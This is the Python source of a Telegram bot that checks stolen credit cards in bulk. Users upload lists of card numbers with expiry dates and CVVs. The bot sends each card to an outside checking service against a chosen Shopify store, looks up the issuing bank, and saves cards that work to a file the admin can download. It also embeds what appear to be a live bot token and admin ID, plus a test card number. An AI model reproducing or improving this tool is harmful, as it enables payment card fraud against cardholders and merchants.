import requests
import telebot
import time
import os
import random
import re
import json
import uuid
import logging
from telebot import types, apihelper
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from dotenv import load_dotenv

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Load environment variables
load_dotenv()
token = os.getenv('TELEGRAM_BOT_TOKEN', '8014070691:AAFiM8td-NaMfIp8TSSrpxYHm3cjyK7QGSU')
admin_id = os.getenv('ADMIN_ID', '6775748231')

# Configure requests session with retries for all HTTP requests
session = requests.Session()
retries = Retry(total=5, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
session.mount('https://', HTTPAdapter(max_retries=retries))
apihelper.SESSION = session

# Initialize Telegram bot
bot = telebot.TeleBot(token, parse_mode="HTML")

# File paths
SUBSCRIBERS_FILE = 'subscribers.json'
SITE_FILE = 'site.json'
SITE_TXT_FILE = 'site.txt'

# Global variables
subscribers = []
user_sites = {}
want_3ds = None
stop_flag = False

# Helper function to format price as $X.XX
def format_price(price):
    try:
        return f"${float(price):.2f}"
    except (ValueError, TypeError):
        return "$0.00"

# Load subscribers from JSON file
def load_subscribers():
    global subscribers
    try:
        if os.path.exists(SUBSCRIBERS_FILE):
            with open(SUBSCRIBERS_FILE, 'r', encoding='utf-8') as f:
                subscribers = json.load(f)
        else:
            subscribers = [admin_id]
            save_subscribers()
    except Exception as e:
        logger.error(f"Error loading subscribers: {e}")
        subscribers = [admin_id]
        save_subscribers()

# Save subscribers to JSON file
def save_subscribers():
    try:
        with open(SUBSCRIBERS_FILE, 'w', encoding='utf-8') as f:
            json.dump(subscribers, f)
    except Exception as e:
        logger.error(f"Error saving subscribers: {e}")

# Load user-specific sites from JSON file
def load_site():
    global user_sites
    try:
        if os.path.exists(SITE_FILE):
            with open(SITE_FILE, 'r', encoding='utf-8') as f:
                user_sites = json.load(f)
        else:
            user_sites = {}
            save_site()
    except Exception as e:
        logger.error(f"Error loading sites: {e}")
        user_sites = {}
        save_site()

# Save user-specific sites to JSON file
def save_site():
    try:
        with open(SITE_FILE, 'w', encoding='utf-8') as f:
            json.dump(user_sites, f)
        return True
    except Exception as e:
        logger.error(f"Error saving sites: {e}")
        return False

# Save URL and price to site.txt
def save_url_price(url, price):
    try:
        formatted_price = format_price(price)
        with open(SITE_TXT_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{url} {formatted_price}\n")
        return True
    except Exception as e:
        logger.error(f"Error saving URL to site.txt: {e}")
        return False

# Initialize subscribers and sites
load_subscribers()
load_site()

# Function to check card using proxkamal.com API
def check_card_api(fullcc, site=None):
    temp_session = requests.Session()
    temp_session.mount('https://', HTTPAdapter(max_retries=retries))
    try:
        cc_num, mm, yy, cvc = fullcc.split("|")
        url = f"https://proxkamal.com/chk.php?cc={fullcc}&site={site}"
        start_time = time.time()
        response = temp_session.get(url, timeout=15)
        response.raise_for_status()
        data = response.json()
        time_taken = time.time() - start_time
        return {
            "status": "Approved ✅" if data.get("Response") == "3ds cc" else "Decline ❌",
            "response": data.get("Response", "Unknown"),
            "price": data.get("Price", "N/A"),
            "gateway": data.get("Gateway", "Unknown"),
            "cc": data.get("cc", fullcc),
            "time_taken": time_taken
        }
    except requests.RequestException as e:
        logger.error(f"API error in check_card_api: {e}")
        return {
            "status": "Decline ❌",
            "response": f"API Error: {str(e)}",
            "price": "N/A",
            "gateway": "Unknown",
            "cc": fullcc,
            "time_taken": 0
        }
    except ValueError:
        return {
            "status": "Decline ❌",
            "response": "Invalid API response",
            "price": "N/A",
            "gateway": "Unknown",
            "cc": fullcc,
            "time_taken": 0
        }
    finally:
        temp_session.close()

@bot.message_handler(commands=["start"])
def start(message):
    if str(message.chat.id) not in subscribers:
        bot.reply_to(message, "Only for authorized users 🙄💗")
        return
    bot.reply_to(message, "Send the file now")

@bot.message_handler(commands=["myurl", ".myurl"])
def set_site(message):
    if str(message.chat.id) not in subscribers:
        bot.reply_to(message, "Only for authorized users 🙄💗")
        return
    try:
        url = message.text.split(maxsplit=1)[1].strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        if not re.match(r'^https?://[\w\-\.]+/?$', url):
            bot.reply_to(message, "Invalid URL format. Please provide a valid URL (e.g., https://shop.example.com).")
            return
        
        temp_msg = bot.reply_to(message, "Checking your site...⌛")
        chat_id = str(message.chat.id)
        user_sites[chat_id] = url
        if not save_site():
            bot.edit_message_text("Failed to save site URL. Please try again.",
                               chat_id=message.chat.id,
                               message_id=temp_msg.message_id)
            return
        
        test_cc = "4504400045685018|04|28|380"
        api_result = check_card_api(test_cc, site=url)
        gateway = f"Auto Shopify {format_price(api_result['price'])}"
        save_url_price(url, api_result['price'])
        
        response_msg = f"""| Site Added ✅
[ϟ] Site: {url}
[ϟ] Gateway: {gateway}
[ϟ] Time Taken: {api_result['time_taken']:.1f}s
━━━━━━━━━━━━━"""
        bot.edit_message_text(response_msg,
                           chat_id=message.chat.id,
                           message_id=temp_msg.message_id)
    except IndexError:
        bot.reply_to(message, "Please provide a URL. Usage: /myurl url.")
    except Exception as e:
        logger.error(f"Error in set_site: {e}")
        bot.edit_message_text(f"Error processing site: {str(e)}",
                           chat_id=message.chat.id,
                           message_id=temp_msg.message_id if 'temp_msg' in locals() else None)

@bot.message_handler(commands=["adduser"])
def add_user(message):
    if str(message.chat.id) != admin_id:
        bot.reply_to(message, "You are not authorized to use this command!")
        return
    try:
        user_id = message.text.split()[1]
        if not user_id.isdigit():
            bot.reply_to(message, "Invalid user ID. Please provide a numeric Telegram user ID.")
            return
        if user_id in subscribers:
            bot.reply_to(message, f"User {user_id} is already authorized.")
            return
        subscribers.append(user_id)
        save_subscribers()
        bot.reply_to(message, f"User {user_id} has been added to authorized users.")
    except IndexError:
        bot.reply_to(message, "Please provide a user ID. Usage: /adduser <code>user_id</code>")

@bot.message_handler(commands=["removeuser"])
def remove_user(message):
    if str(message.chat.id) != admin_id:
        bot.reply_to(message, "You are not authorized to use this command!")
        return
    try:
        user_id = message.text.split()[1]
        if not user_id.isdigit():
            bot.reply_to(message, "Invalid user ID. Please provide a numeric Telegram user ID.")
            return
        if user_id not in subscribers:
            bot.reply_to(message, f"User {user_id} is not in the authorized list.")
            return
        subscribers.remove(user_id)
        save_subscribers()
        bot.reply_to(message, f"User {user_id} has been removed from authorized users.")
    except IndexError:
        bot.reply_to(message, "Please provide a user ID. Usage: /removeuser <code>user_id</code>")

@bot.message_handler(commands=["listusers"])
def list_users(message):
    if str(message.chat.id) != admin_id:
        bot.reply_to(message, "You are not authorized to use this command!")
        return
    if not subscribers:
        bot.reply_to(message, "No authorized users found.")
        return
    users_list = "\n".join(subscribers)
    bot.reply_to(message, f"Authorized Users:\n{users_list}")

@bot.message_handler(commands=["getfile"])
def get_file(message):
    if str(message.chat.id) != admin_id:
        bot.reply_to(message, "You are not authorized to use this command!")
        return
    if not os.path.exists("approved.txt"):
        bot.reply_to(message, "No approved cards file found.")
        return
    try:
        with open("approved.txt", "rb") as f:
            bot.send_document(message.chat.id, f, caption="Approved Cards")
    except Exception as e:
        logger.error(f"Error sending file: {e}")
        bot.reply_to(message, f"Error sending file: {e}")

@bot.message_handler(commands=["getsites"])
def get_sites_file(message):
    if str(message.chat.id) != admin_id:
        bot.reply_to(message, "You are not authorized to use this command!")
        return
    if not os.path.exists(SITE_TXT_FILE):
        bot.reply_to(message, "No sites file found.")
        return
    try:
        with open(SITE_TXT_FILE, "rb") as f:
            bot.send_document(message.chat.id, f, caption="Sites List")
        logger.info(f"Admin {message.chat.id} retrieved site.txt")
    except Exception as e:
        logger.error(f"Error sending sites file: {e}")
        bot.reply_to(message, f"Error sending sites file: {e}")

@bot.message_handler(commands=["checkuser"])
def check_user(message):
    if str(message.chat.id) != admin_id:
        bot.reply_to(message, "You are not authorized to use this command!")
        return
    try:
        user_id = message.text.split()[1]
        if not user_id.isdigit():
            bot.reply_to(message, "Invalid user ID. Please provide a numeric Telegram user ID.")
            return
        status = "authorized" if user_id in subscribers else "not authorized"
        bot.reply_to(message, f"User {user_id} is {status}.")
        logger.info(f"Admin checked user {user_id}: {status}")
    except IndexError:
        bot.reply_to(message, "Please provide a user ID. Usage: /checkuser <code>user_id</code>")

def get_bin_info(bin_number):
    temp_session = requests.Session()
    temp_session.mount('https://', HTTPAdapter(max_retries=retries))
    try:
        req = temp_session.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=15)
        req.raise_for_status()
        return {
            "brand": req.json().get("brand", "Unknown"),
            "card_type": req.json().get("type", "Unknown"),
            "level": req.json().get("level", "Unknown"),
            "bank": req.json().get("bank", "Unknown"),
            "country_name": req.json().get("country_name", "Unknown"),
            "country_flag": req.json().get("country_flag", ""),
        }
    except Exception as e:
        logger.error(f"Error in get_bin_info: {e}")
        return {
            "brand": "Unknown",
            "card_type": "Unknown",
            "level": "Unknown",
            "bank": "Unknown",
            "country_name": "Unknown",
            "country_flag": "",
        }
    finally:
        temp_session.close()

def save_approved_cc(fullcc, bin_info, reason):
    try:
        with open("approved.txt", "a", encoding="utf-8") as f:
            f.write(f"{fullcc}\n")
    except Exception as e:
        logger.error(f"Error saving approved CC: {e}")

@bot.message_handler(content_types=["document"])
def main(message):
    global stop_flag
    if str(message.chat.id) not in subscribers:
        bot.reply_to(message, "Only for authorized users 🙄💗")
        return
    
    chat_id = str(message.chat.id)
    if chat_id not in user_sites or not user_sites[chat_id]:
        bot.reply_to(message, "No site URL set. Please set a site using /myurl url.")
        return
    
    global want_3ds
    want_3ds = None
    stop_flag = False  # Reset stop flag for new file processing
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    yes_button = types.InlineKeyboardButton("Yes ✅", callback_data=f"3ds_yes_{message.message_id}")
    no_button = types.InlineKeyboardButton("No ❌", callback_data=f"3ds_no_{message.message_id}")
    markup.add(yes_button, no_button)
    bot.reply_to(message, "Are you need for 3ds ccs in chat?", reply_markup=markup)
    
    temp_file = f"temp_file_{uuid.uuid4()}.txt"
    try:
        with open(temp_file, "wb") as w:
            file_info = bot.get_file(message.document.file_id)
            ee = bot.download_file(file_info.file_path)
            w.write(ee)
    except Exception as e:
        logger.error(f"Error saving temp file: {e}")
        bot.reply_to(message, "Error processing file upload.")
        return

@bot.callback_query_handler(func=lambda call: call.data.startswith("3ds_"))
def handle_3ds_choice(call):
    global want_3ds, stop_flag
    message_id = int(call.data.split("_")[-1])
    
    if call.data.startswith("3ds_yes"):
        want_3ds = True
    elif call.data.startswith("3ds_no"):
        want_3ds = False
    
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception as e:
        logger.error(f"Error deleting prompt message: {e}")
    
    chat_id = str(call.message.chat.id)
    if chat_id not in user_sites or not user_sites[chat_id]:
        bot.send_message(call.message.chat.id, "No site URL set. Please set a site using /myurl url.")
        return
    
    user_site = user_sites[chat_id]
    temp_file = next((f for f in os.listdir('.') if f.startswith("temp_file_") and f.endswith('.txt')), None)
    if not temp_file:
        bot.send_message(call.message.chat.id, "Temporary file not found. Please upload the file again.")
        return
    
    dd = 0
    live = 0
    ko = bot.send_message(call.message.chat.id, "Checking Your Cards...⌛").message_id
    
    try:
        with open(temp_file, 'r', encoding='utf-8') as file:
            lino = file.readlines()
            cleaned_lino = []
            for line in lino:
                parts = line.strip().split("|")
                if len(parts) == 4:
                    parts[0] = re.sub(r'[^0-9]', '', parts[0])
                    cleaned_lino.append("|".join(parts))
            total = len(cleaned_lino)
            
            for cc in cleaned_lino:
                cc = cc.strip()
                if not cc:
                    continue
                
                if stop_flag:
                    bot.edit_message_text(chat_id=call.message.chat.id, message_id=ko,
                                       text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @CODExHYPER')
                    return
                
                try:
                    cc_num, mm, yy, cvc = cc.split("|")
                    if not re.match(r'^\d{12,19}$', cc_num):
                        dd += 1
                        last = "Decline ❌ - Invalid card number format"
                        continue
                except ValueError:
                    dd += 1
                    last = "Decline ❌ - Invalid Format"
                    continue
                
                fullcc = f"{cc_num}|{mm}|{yy}|{cvc}"
                bin_number = cc_num[:6]
                bin_info = get_bin_info(bin_number)
                
                api_result = check_card_api(fullcc, site=user_site)
                reason = api_result["response"]
                price = format_price(api_result["price"])
                gateway = api_result["gateway"]
                
                if want_3ds:
                    if reason == "3ds cc":
                        status = "Approved ✅"
                        live += 1
                        last = f"Approved ✅ - {reason}"
                    else:
                        status = "Decline ❌"
                        dd += 1
                        last = f"Decline ❌ - {reason}"
                else:
                    if reason == "3ds cc":
                        status = "Decline ❌"
                        dd += 1
                        last = f"Decline ❌ - {reason}"
                    else:
                        status = api_result["status"]
                        if status == "Approved ✅":
                            live += 1
                            save_approved_cc(fullcc, bin_info, reason)
                            last = f"Approved ✅ - {reason}"
                        else:
                            dd += 1
                            last = f"Decline ❌ - {reason}"
                
                reason_only = last.split(" - ", 1)[1] if " - " in last else last
                
                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• {fullcc} •", callback_data='u8')
                status_btn = types.InlineKeyboardButton(f"• STATUS ➜ {reason_only} •", callback_data='u8')
                cm3 = types.InlineKeyboardButton(f"• APPROVED ✅ ➜ [ {live} ] •", callback_data='x')
                cm4 = types.InlineKeyboardButton(f"• DECLINED ❌ ➜ [ {dd} ] •", callback_data='x')
                cm5 = types.InlineKeyboardButton(f"• TOTAL 👻 ➜ [ {total} ] •", callback_data='x')
                stop = types.InlineKeyboardButton(f"[ STOP ]", callback_data='stop')
                mes.add(cm1, status_btn, cm3, cm4, cm5, stop)
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=ko,
                                   text='''Wait for processing 
𝒃𝒚 ➜ @CODExHYPER ''', reply_markup=mes)
                
                if status == "Approved ✅":
                    msg = f'''◆ 𝑪𝑨𝑹𝑫  ➜ <code>{fullcc}</code> 
◆ 𝑺𝑻𝑨𝑻𝑼𝑺 ➜ 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅
◆ 𝑹𝑬𝑺𝑼𝑳𝑻 ➜ {reason}
◆ 𝑷𝑹𝑰𝑪𝑬 ➜ {price}
◆ 𝑮𝑨𝑻𝑬𝑾𝑨𝒀 ➜ {gateway}
━━━━━━━━━━━━━━━━━
◆ 𝑩𝑰𝑵 ➜ {bin_number} - {bin_info['brand']} - {bin_info['card_type']}
◆ 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {bin_info['country_name']} - {bin_info['country_flag']}
◆ 𝑩𝑨𝑵𝑲 ➜ {bin_info['bank']}
━━━━━━━━━━━━━━━━━
◆ 𝑩𝒀: @CODExHYPER'''
                    bot.send_message(call.message.chat.id, msg)
                
                time.sleep(2)  # Rate limit API calls
                
    except Exception as e:
        logger.error(f"Error processing file: {e}")
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=ko, text=f"Error processing file: {e}")
    
    finally:
        if os.path.exists(temp_file):
            os.remove(temp_file)
        if os.path.exists('stop.stop'):
            os.remove('stop.stop')
        want_3ds = None
        stop_flag = False
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=ko,
                           text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @CODExHYPER')

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    global stop_flag
    try:
        stop_flag = True
        with open("stop.stop", "w") as file:
            pass
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @CODExHYPER'
        )
        logger.info("Stop button pressed, processing halted")
    except Exception as e:
        logger.error(f"Error handling stop callback: {e}")

# Start polling with error handling
def start_polling():
    while True:
        try:
            logger.info("Starting bot polling...")
            bot.polling(none_stop=True, interval=1, timeout=30)
        except apihelper.ApiException as e:
            if "429" in str(e) or "Too Many Requests" in str(e):
                retry_after = 15  # Default wait time; adjust if API provides specific value
                logger.warning(f"Rate limit hit, waiting for {retry_after} seconds...")
                time.sleep(retry_after)
            else:
                logger.error(f"Polling error: {e}", exc_info=True)
                time.sleep(15)
                logger.info("Retrying polling...")
        except Exception as e:
            logger.error(f"Polling error: {e}", exc_info=True)
            time.sleep(15)
            logger.info("Retrying polling...")

if __name__ == "__main__":
    print("+--------------------------------------------------------+")
    start_polling()
